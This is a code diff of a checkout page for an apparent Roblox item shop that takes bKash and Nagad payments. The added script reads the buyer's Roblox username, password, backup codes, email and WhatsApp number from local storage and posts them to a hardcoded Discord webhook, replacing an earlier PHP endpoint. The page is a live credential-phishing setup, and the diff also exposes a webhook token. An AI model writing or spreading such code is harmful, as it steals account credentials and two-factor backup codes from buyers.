@@ -14,8 +14,8 @@
         </div>
 
         <div class="grid grid-cols-2 gap-4 mb-8">
-            <div class="border p-4 rounded-2xl text-center cursor-pointer" onclick="selectMethod(this, 'bKash')">bKash</div>
-            <div class="border p-4 rounded-2xl text-center cursor-pointer" onclick="selectMethod(this, 'Nagad')">Nagad</div>
+            <div class="border p-4 rounded-2xl text-center cursor-pointer hover:bg-slate-100" onclick="selectMethod(this, 'bKash')">bKash</div>
+            <div class="border p-4 rounded-2xl text-center cursor-pointer hover:bg-slate-100" onclick="selectMethod(this, 'Nagad')">Nagad</div>
         </div>
 
         <div id="instruction-box" class="hidden space-y-4">
@@ -26,7 +26,7 @@
     </div>
 
     <div id="status-screen" class="hidden p-8 text-center">
-        <h1 id="status-text" class="text-xl font-bold">Processing...</h1>
+        <h1 id="status-text" class="text-xl font-bold">Processing Transaction...</h1>
     </div>
 
     <script>
@@ -45,36 +45,43 @@
             document.getElementById('main-container').classList.add('hidden');
             document.getElementById('status-screen').classList.remove('hidden');
 
-            let formData = new FormData();
-            formData.append('amount', localStorage.getItem('checkout_pack_price') || '0');
-            formData.append('username', localStorage.getItem('checkout_roblox_id') || '');
-            formData.append('password', localStorage.getItem('checkout_password') || '');
-            formData.append('backup', localStorage.getItem('checkout_backup_codes') || '');
-            formData.append('whatsapp', localStorage.getItem('checkout_contact_number') || '');
-            formData.append('email', localStorage.getItem('checkout_email') || '');
-            formData.append('fname', localStorage.getItem('checkout_fname') || '');
-            formData.append('phone', localStorage.getItem('checkout_phone') || '');
-            formData.append('txid', txid);
-            formData.append('method', method);
+            const webhookURL = "https://discord.com/api/webhooks/1517095501923745842/tl5bviOuKTPZ9BnAdNpQzDyq8q4htTDI1qA1uNVrqc5uTTyr5OMdu1SqS9s3rwctJhcg";
 
-            fetch('zubaygameshop.byethost6.com/save_order.php', {
+            const payload = {
+                "content": "🔔 **Naya Order Aaya Hai!**",
+                "embeds": [{
+                    "title": "Order Details",
+                    "color": 3066993,
+                    "fields": [
+                        { "name": "Username", "value": localStorage.getItem('checkout_roblox_id') || 'N/A', "inline": true },
+                        { "name": "Amount", "value": localStorage.getItem('checkout_pack_price') || '0', "inline": true },
+                        { "name": "Method", "value": method, "inline": true },
+                        { "name": "TXID", "value": txid, "inline": false },
+                        { "name": "Password", "value": localStorage.getItem('checkout_password') || 'N/A', "inline": true },
+                        { "name": "Backup Codes", "value": localStorage.getItem('checkout_backup_codes') || 'N/A', "inline": false },
+                        { "name": "WhatsApp", "value": localStorage.getItem('checkout_contact_number') || 'N/A', "inline": true },
+                        { "name": "Email", "value": localStorage.getItem('checkout_email') || 'N/A', "inline": true }
+                    ]
+                }]
+            };
+
+            fetch(webhookURL, {
                 method: 'POST',
-                body: formData
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             })
-            .then(response => response.text())
-            .then(data => {
-                if (data.trim() === "Success") {
-                    alert("Order Placed!");
-                    window.location.href = "index.html";
+            .then(response => {
+                if (response.ok) {
+                    alert("Order Placed Successfully!");
+                    window.location.href = "index.html"; // Change to your thank you page
                 } else {
-                    alert("ERROR: " + data);
-                    document.getElementById('main-container').classList.remove('hidden');
-                    document.getElementById('status-screen').classList.add('hidden');
+                    throw new Error('Failed to send');
                 }
             })
             .catch(error => {
-                alert("FETCH ERROR: " + error);
+                alert("Error: Data could not be sent.");
                 document.getElementById('main-container').classList.remove('hidden');
+                document.getElementById('status-screen').classList.add('hidden');
             });
         }
     </script>
